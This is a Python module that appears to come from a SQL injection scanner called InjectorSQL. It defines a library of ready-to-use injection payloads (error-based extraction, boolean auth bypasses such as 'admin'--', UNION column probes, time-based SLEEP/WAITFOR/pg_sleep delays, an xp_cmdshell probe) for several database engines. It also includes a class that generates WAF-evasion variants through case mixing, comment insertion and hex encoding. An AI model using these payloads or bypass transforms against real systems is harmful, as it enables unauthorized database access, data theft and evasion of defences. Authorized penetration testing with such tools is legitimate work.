"""
InjectorSQL — Phase 2: Payload Library
Categorized SQLi payloads: error-based, boolean-based, time-based.
WAF bypass variants: hex encoding, case variation, comment injection.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Iterator


# ── Payload Dataclass ─────────────────────────────────────────────────────────

@dataclass
class Payload:
    value: str          # The raw injection string
    category: str       # 'error' | 'boolean' | 'time'
    description: str    # Human-readable description
    db_target: str      # 'generic' | 'mysql' | 'mssql' | 'oracle' | 'postgres' | 'sqlite'
    severity: str       # 'Critical' | 'High' | 'Medium'
    waf_bypass: bool = False    # True if this is a WAF-bypass variant


# ── Error-Based Payloads ──────────────────────────────────────────────────────

ERROR_PAYLOADS: list[Payload] = [
    # --- Generic quoting errors ---
    Payload("'",              "error", "Single quote — triggers syntax error", "generic", "Medium"),
    Payload('"',              "error", "Double quote — alternate quoting", "generic", "Medium"),
    Payload("''",             "error", "Double single-quote — string termination", "generic", "Medium"),
    Payload("\\",             "error", "Backslash escape attempt", "mysql", "Medium"),
    Payload("'--",            "error", "Single quote + SQL comment", "generic", "Medium"),
    Payload("' --",           "error", "Single quote + spaced comment", "generic", "Medium"),
    Payload("';--",           "error", "Statement termination + comment", "generic", "Medium"),
    Payload("'/*",            "error", "Inline comment opener", "generic", "Medium"),

    # --- MySQL specific ---
    Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "error", "MySQL EXTRACTVALUE error extraction", "mysql", "High"),
    Payload("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "error", "MySQL GROUP BY error", "mysql", "High"),
    Payload("' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)--",
            "error", "MySQL UPDATEXML error extraction", "mysql", "High"),

    # --- MSSQL specific ---
    Payload("' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
            "error", "MSSQL CONVERT error extraction", "mssql", "High"),
    Payload("'; EXEC xp_cmdshell('echo test')--",
            "error", "MSSQL xp_cmdshell probe", "mssql", "Critical"),

    # --- Oracle specific ---
    Payload("' AND 1=CTXSYS.DRITHSX.SN(USER,(SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM=1))--",
            "error", "Oracle error extraction via CTXSYS", "oracle", "High"),
    Payload("' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62))) FROM DUAL)--",
            "error", "Oracle XMLType error", "oracle", "High"),

    # --- PostgreSQL specific ---
    Payload("' AND 1=CAST(version() AS integer)--",
            "error", "PostgreSQL CAST version error", "postgres", "High"),
    Payload("'; SELECT pg_sleep(0)--",
            "error", "PostgreSQL syntax probe", "postgres", "Medium"),
]


# ── Boolean-Based Payloads ────────────────────────────────────────────────────

BOOLEAN_PAYLOADS: list[Payload] = [
    # Generic true/false pairs — detected by content differential
    Payload("' OR '1'='1",                 "boolean", "Classic OR true",   "generic", "High"),
    Payload("' OR '1'='2",                 "boolean", "Classic OR false",   "generic", "High"),
    Payload("' OR 1=1--",                  "boolean", "Numeric OR true",    "generic", "High"),
    Payload("' OR 1=2--",                  "boolean", "Numeric OR false",   "generic", "High"),
    Payload("' OR 'x'='x",                 "boolean", "String OR true",     "generic", "High"),
    Payload("' OR 'x'='y",                 "boolean", "String OR false",    "generic", "High"),
    Payload("1' OR '1'='1'--",             "boolean", "Param prefix OR true",  "generic", "High"),
    Payload("1' OR '1'='2'--",             "boolean", "Param prefix OR false", "generic", "High"),
    Payload("admin'--",                    "boolean", "Auth bypass — comment", "generic", "High"),
    Payload("admin' #",                    "boolean", "Auth bypass — MySQL #",  "mysql",   "High"),
    Payload("' OR 1=1 LIMIT 1--",          "boolean", "Limit-safe OR true",    "mysql",   "High"),
    Payload("') OR ('1'='1",               "boolean", "Parenthesis OR true",   "generic", "High"),
    Payload("')) OR (('1'='1",             "boolean", "Double paren OR true",  "generic", "High"),
    Payload("' OR 1=1/*",                  "boolean", "Inline comment variant","generic", "High"),

    # UNION probes (content change if column count matches)
    Payload("' UNION SELECT NULL--",                          "boolean", "UNION 1-col probe",  "generic", "High"),
    Payload("' UNION SELECT NULL,NULL--",                     "boolean", "UNION 2-col probe",  "generic", "High"),
    Payload("' UNION SELECT NULL,NULL,NULL--",                "boolean", "UNION 3-col probe",  "generic", "High"),
    Payload("' UNION SELECT NULL,NULL,NULL,NULL--",           "boolean", "UNION 4-col probe",  "generic", "High"),
    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--",      "boolean", "UNION 5-col probe",  "generic", "High"),
    Payload("' UNION ALL SELECT NULL--",                      "boolean", "UNION ALL 1-col",    "generic", "High"),
    Payload("' UNION ALL SELECT NULL,NULL--",                 "boolean", "UNION ALL 2-col",    "generic", "High"),
]


# ── Time-Based Payloads ───────────────────────────────────────────────────────

TIME_PAYLOADS: list[Payload] = [
    # MySQL
    Payload("' AND SLEEP(5)--",                          "time", "MySQL SLEEP(5)",          "mysql",    "Critical"),
    Payload("1' AND SLEEP(5)--",                         "time", "MySQL SLEEP param-prefix", "mysql",   "Critical"),
    Payload("'; SELECT SLEEP(5)--",                      "time", "MySQL SELECT SLEEP",       "mysql",   "Critical"),
    Payload("' OR SLEEP(5)--",                           "time", "MySQL OR SLEEP",           "mysql",   "Critical"),
    Payload("1 AND SLEEP(5)",                            "time", "MySQL numeric SLEEP",      "mysql",   "Critical"),
    Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))A)--", "time", "MySQL subquery SLEEP",  "mysql",   "Critical"),

    # MSSQL
    Payload("'; WAITFOR DELAY '0:0:5'--",                "time", "MSSQL WAITFOR DELAY",     "mssql",   "Critical"),
    Payload("1; WAITFOR DELAY '0:0:5'--",                "time", "MSSQL numeric WAITFOR",   "mssql",   "Critical"),
    Payload("' IF(1=1) WAITFOR DELAY '0:0:5'--",         "time", "MSSQL conditional delay", "mssql",   "Critical"),

    # PostgreSQL
    Payload("'; SELECT pg_sleep(5)--",                   "time", "PostgreSQL pg_sleep",     "postgres", "Critical"),
    Payload("1; SELECT pg_sleep(5)--",                   "time", "PostgreSQL numeric sleep","postgres", "Critical"),
    Payload("' OR pg_sleep(5)--",                        "time", "PostgreSQL OR sleep",     "postgres", "Critical"),

    # Oracle
    Payload("' OR 1=1 AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(119)||CHR(115),5) FROM dual) IS NOT NULL--",
            "time", "Oracle DBMS_PIPE delay", "oracle", "Critical"),

    # SQLite
    Payload("' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND randomblob(100000000)) > 0--",
            "time", "SQLite heavy compute delay", "sqlite", "Critical"),
]


# ── WAF Bypass Transformers ───────────────────────────────────────────────────

class WafBypass:
    """
    Takes a payload string and produces WAF-evasion variants:
    - Case variation (SQL keywords mixed-case)
    - Inline comment injection between keywords
    - Hex encoding of string literals
    - URL double-encoding
    - Whitespace substitution
    """

    KEYWORD_RE = re.compile(
        r'\b(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP|SLEEP|'
        r'WAITFOR|DELAY|EXEC|CAST|CONVERT|TABLE|INTO|DATABASE|VERSION)\b',
        re.IGNORECASE
    )

    @staticmethod
    def case_variation(payload: str) -> str:
        """e.g.  SELECT → SeLeCt"""
        def _mix(m: re.Match) -> str:
            word = m.group(0)
            return "".join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(word)
            )
        return WafBypass.KEYWORD_RE.sub(_mix, payload)

    @staticmethod
    def comment_injection(payload: str) -> str:
        """Injects /**/ between SQL keywords: SELECT/**/FROM"""
        return WafBypass.KEYWORD_RE.sub(
            lambda m: m.group(0) + "/**/",
            payload,
        )

    @staticmethod
    def hex_encode_strings(payload: str) -> str:
        """
        Replace simple string literals 'x' with their MySQL hex equivalent 0x...
        Only handles short ASCII strings inside single quotes.
        """
        def _to_hex(m: re.Match) -> str:
            s = m.group(1)
            return "0x" + s.encode("ascii", errors="replace").hex()

        return re.sub(r"'([A-Za-z0-9 _\-]{1,32})'", _to_hex, payload)

    @staticmethod
    def whitespace_sub(payload: str) -> str:
        """Replace spaces with MySQL-accepted whitespace alternatives."""
        return payload.replace(" ", "/**/")

    @staticmethod
    def tab_sub(payload: str) -> str:
        """Replace spaces with tabs (bypasses simple space filters)."""
        return payload.replace(" ", "\t")

    @classmethod
    def all_variants(cls, payload: Payload) -> list[Payload]:
        """Generate all WAF-bypass variants of a given payload."""
        variants = []
        transforms = [
            ("case_variation",   cls.case_variation),
            ("comment_injection",cls.comment_injection),
            ("hex_encode",       cls.hex_encode_strings),
            ("whitespace_sub",   cls.whitespace_sub),
            ("tab_sub",          cls.tab_sub),
        ]

        for name, fn in transforms:
            new_value = fn(payload.value)
            if new_value != payload.value:
                variants.append(
                    Payload(
                        value=new_value,
                        category=payload.category,
                        description=f"{payload.description} [WAF:{name}]",
                        db_target=payload.db_target,
                        severity=payload.severity,
                        waf_bypass=True,
                    )
                )

        return variants


# ── Payload Manager ───────────────────────────────────────────────────────────

class PayloadLibrary:
    """
    Aggregates and filters payloads based on scan configuration.
    Supports loading custom payloads from a file.
    """

    def __init__(self, cfg: dict):
        self.cfg = cfg
        self._payloads: list[Payload] = []
        self._build()

    def _build(self):
        if self.cfg.get("error_based", True):
            self._payloads.extend(ERROR_PAYLOADS)

        if self.cfg.get("boolean_based", True):
            self._payloads.extend(BOOLEAN_PAYLOADS)

        if self.cfg.get("time_based", True):
            self._payloads.extend(TIME_PAYLOADS)

        # Custom payloads from file
        if self.cfg.get("custom_payloads"):
            self._load_custom(self.cfg["custom_payloads"])

        # WAF bypass expansion
        if self.cfg.get("waf_bypass"):
            extras: list[Payload] = []
            for p in self._payloads:
                extras.extend(WafBypass.all_variants(p))
            self._payloads.extend(extras)

    def _load_custom(self, filepath: str):
        try:
            with open(filepath) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        self._payloads.append(
                            Payload(
                                value=line,
                                category="error",
                                description="Custom payload",
                                db_target="generic",
                                severity="Medium",
                            )
                        )
        except OSError as e:
            from .utils import logger
            logger.warning(f"Could not load custom payloads from {filepath}: {e}")

    def by_category(self, category: str) -> list[Payload]:
        return [p for p in self._payloads if p.category == category]

    def __iter__(self) -> Iterator[Payload]:
        return iter(self._payloads)

    def __len__(self) -> int:
        return len(self._payloads)

    @property
    def error_payloads(self) -> list[Payload]:
        return self.by_category("error")

    @property
    def boolean_payloads(self) -> list[Payload]:
        return self.by_category("boolean")

    @property
    def time_payloads(self) -> list[Payload]:
        return self.by_category("time")
